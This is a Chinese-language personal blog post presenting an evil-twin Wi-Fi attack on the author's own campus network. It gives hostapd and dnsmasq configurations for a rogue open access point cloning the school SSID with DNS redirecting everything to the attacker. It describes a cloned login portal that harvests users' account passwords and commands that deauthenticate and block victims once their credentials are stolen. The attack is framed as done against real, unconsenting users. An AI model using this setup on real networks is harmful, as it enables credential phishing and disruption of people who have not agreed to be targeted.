<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title> WIFI 热点欺骗 </title>
	<meta name="description" content="">
	<meta name="author" content="nullne">

	<!-- HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
		<script src="/theme/js/html5.js"></script>
	<![endif]-->

    <script src="/theme/js/jquery-2.1.1.min.js"></script>
    <script src="/theme/js/bootstrap.min.js"></script>
    <script src="/theme/js/project.js"></script>

	<!-- Styles -->
    <link rel="shortcut icon" href="/theme/img/icons/fav.ico" >

	<link href="/theme/css/bootstrap.min.css" rel="stylesheet">
	<link href="/theme/css/bootstrap-theme.min.css" rel="stylesheet">
	<link href="/theme/css/local.css" rel="stylesheet">
	<link href="/theme/css/pygments.css" rel="stylesheet">
    <link href="/theme/tipuesearch/tipuesearch.css" rel="stylesheet" >

	<!-- Feeds -->
	<link href="/all-atom.xml" type="application/atom+xml" rel="alternate" title="NULLNE Atom Feed" />




<script>var _gaq=[['_setAccount','UA-56583262-1'],['_trackPageview']];(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];g.src='//www.google-analytics.com/ga.js';s.parentNode.insertBefore(g,s)}(document,'script'))</script>
</head>
<body>

<div id="protect" style="text-align:center;width:100%;height:100%;z-index:1000;position:absolute;background-color:black">
        <input style="margin-top:300px" type="password" id="password"></input>
</div>

<nav class="navbar navbar-default navbar-fixed-top navbar-inverse">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">NULLNE</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">

          <li class="active"><a href="/category/web.html">Web</a></li>
          <li ><a href="/category/suo-sui.html">琐碎</a></li>
          <li ><a href="/category/ssh.html">SSH</a></li>
          <li ><a href="/category/golang.html">Golang</a></li>
          <li><a href="/about.html">About</a></li>
      </ul>
      <form class="navbar-form navbar-left pull-right" role="search" id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
        <div class="form-group">
          <input type="text" class="form-control" placeholder="Search">
        </div>
        <!--<button type="submit" class="btn btn-default">Submit</button> -->
      </form>
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>

    <div class="wrapper">

    <div class="container content-wrapper">
        <div class="content fixed-head-top">
	<div class='article'>
		<div class="page-header">
            <h1>WIFI 热点欺骗</h1>
<ul class="pull-right" style="list-style:none">
    <li>Publish At: 2014-11-23 15:21:00+08:00</li>
    <!--
    <li>in:</strong><a href="/category/web.html">web</a></li>
    <li>Wrote by:<a class="url fn" href="/author/nullne.html">nullne </a></li>
 
    <li>Tags:
        <a href="/tag/wifi.html">WIFI</a>
        <a href="/tag/linux.html">Linux</a>
    </li>
 
    -->
</ul>        </div>
		<div><p><em>很久以前看过一篇关于WIFI脆弱性的<a href="http://fex.baidu.com/blog/2014/04/traffic-hijack/">介绍</a>(找了好久终于被我找到了)，其中有一部分讲的是由于本身协议的弱点，相同 ssid 的热点会被合并为同一个，至于用户最终连接哪个热点取决于他所能接收到的信号强度。不知道此刻各位看官脑洞有没有大开？</em></p>
<p><em>俗话说杀生不如宰熟，所以直接就向学校 ap 下手了。提前声明几个全局变量：</em></p>
<div class="highlight"><pre><span class="n">ssid</span><span class="o">:</span> <span class="n">NICESHOT</span>
<span class="n">os</span><span class="err">：</span> <span class="n">ubuntu</span>
</pre></div>


<h3>简单部署</h3>
<h4>用 hostapd 建立热点</h4>
<blockquote>
<p>“<strong>hostapd</strong> is a user space daemon for access point and authentication servers. “</p>
</blockquote>
<div class="highlight"><pre>sudo apt-get install hostapd
</pre></div>


<p>更改配置文件 <em>/etc/hostapd-hotspot.conf</em> 如下：</p>
<div class="highlight"><pre># WiFi Hotspot
interface=wlan0
driver=nl80211
#Access Point
ssid=NICESHOT
hw_mode=g
# WiFi Channel:
channel=1
#macaddr_acl=0
auth_algs=1
wmm_enabled=0
#ignore_broadcast_ssid=0
#wpa=3
#wpa_passphrase=1
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP
#rsn_pairwise=CCMP
ctrl_interface=/var/run/hostapd
</pre></div>


<p>可能还需要更改 <em>/etc/default/hostapd</em> 为</p>
<div class="highlight"><pre>DAEMON_CONF=/etc/hostapd/hostapd.conf
</pre></div>


<p>然后测试配置文件<code>hostapd -d /etc/hostapd-hotspot.conf</code>,  没有什么问题的话就可以启动服务了</p>
<div class="highlight"><pre>service hostapd start
</pre></div>


<h4>微型 DNCP &amp; DNS -- dnsmasq</h4>
<blockquote>
<p>Dnsmasq is a free software DNS forwarder and DHCP server for small networks. It is considered to be easily configured, with low system resource usage.</p>
</blockquote>
<div class="highlight"><pre>sudo apt-get install dnsmasq
</pre></div>


<p>更改配置文件 <em>/etc/dnsmasq.conf</em></p>
<div class="highlight"><pre>log-facility=/var/log/dnsmasq.log
address=/#/192.168.1.1
interface=wlan0                                                                             
dhcp-range=192.168.1.20,192.168.1.254,12h
no-resolv 
</pre></div>


<p>然后比较关键的是配置 <strong>wlan0</strong> IP 地址 <code>ifconfig wlan0 192.168.1.1</code>。</p>
<p>稍微总结一下，到此为止，我们做了这么些事情：创建 WFIFI 热点，监听 <strong>wlan0</strong> 口，然后通过配置DHCP给所有连接到此 AP 的终端分配IP地址。另外上面的这条配置<code>address=/#/192.168.1.1</code>，将所有地址解析到我们的电脑 IP。</p>
<h4>搭建服务器</h4>
<p>此处就不详说了，最终达到的效果是访问 <code>192.168.1.1</code>是我们的钓鱼网站。</p>
<p>因为校园网需要登陆，也就是说连接校园 AP 之后将所有 HTTP 页面跳转到网关登陆界面。所以我们也部署一个一模一样的登陆网关，然后所有连接的用户跟往常一样登陆网关，神不知鬼不觉得就把账号密码泄露过来了。稍后我会分享此处的简单代码 DEMO 到 GitHub。</p>
<h3>进阶</h3>
<p>当然不能停止在这么简陋的东西上面，我们需要更进一步。</p>
<h4>粗暴的强制下线</h4>
<p>毕竟我们只有一个无线网卡，用作 AP 之后就不能接入其他网络了，环境也不允许拉一根网线，用户登录网关之后根本没办法继续上网，很快你的伪 AP 就会被发现。所以我们强制所有登录网关，也就是被我们窃取密码的用户离线。</p>
<div class="highlight"><pre>hostapd_cli deauthenticate 38:bc:1a:88:12:61                                                     
iptables -A INPUT -m mac --mac-source 38:bc:1a:88:12:61 -j DROP
</pre></div>


<p>第一句强制用户离线，之前在配置 hostapd 的时，这句就是为了达到这个目的 <code>ctrl_interface=/var/run/hostapd</code>，第二句将所有该设备的请求丢弃。这就是当一个人丧失所有利用价值之后的下场！</p>
<h4>配置更为合理的 iptables（还没有实现）</h4>
<p>当然，前提是我们自己的电脑还可以通过其他口，比如 <em>eth0</em>，访问正常网络。</p>
<p>通过配置合理强大的 <strong>iptables</strong>,精心布局，我们不仅仅获取网关密码这么简单的并且还需要特别严格苛刻的场景的蛋糕。拭目以待。。。</p>
<h3>思考</h3>
<h3>后记</h3>
<h4>伤敌一百，自损三千</h4>
<p>因为自己的装备跟技术很挫，在配置之前那些东西的时候碰到了一些问题，险些出师未捷身先死。</p>
<p>在 ubuntu 下，<code>service networking restart</code>,然后你就各种问题爽翻天
- 现在，至少目前为止插上网线之后还需要 <code>ifup eth0</code> 才能通过有线上网
- 现在，至少目前为止我连接 WIFI 的时候需要这么做（运气好的话差不多能连接上）</p>
<div class="highlight"><pre>ifup wlan0   #up the wlan port 
iwlist wlan0 scan #list availabel wifi ssid
iwconfig wlan0 essid &quot;NICESHOT&quot;  #no password
iwconfig wlan0 ssid &quot;NICESHOT&quot; key password   #with password
dhcpclient wlan0   #get ip via dhcp 
</pre></div>


<ul>
<li>电脑里面出现了奇怪的端口:wlan0:avahi</li>
<li>系统自带的 network-manager 罢工了</li>
<li>其他未知错误待续</li>
</ul></div>
	</div>
        </div>
        <div class="push"></div>
    </div><!--container-fluid-->

<div style="text-align:center;background-color:rgb(97, 83, 83);width:100%;height:auto">
        <div id="comments"></div>
        <script src="https://apis.google.com/js/plusone.js"></script>
        <script>
        gapi.comments.render('comments', {
            href: window.location,
            width: '624',
            first_party_property: 'BLOGGER',
            view_type: 'FILTERED_POSTMOD'
        });
        </script>

        <!--
        <div id="commentscounter"></div>
        <script>
        gapi.commentcount.render('commentscounter', {
            href: window.location
        });
        </script>
        -->
</div>
    </div><!--wrapper-->
</body>
</html>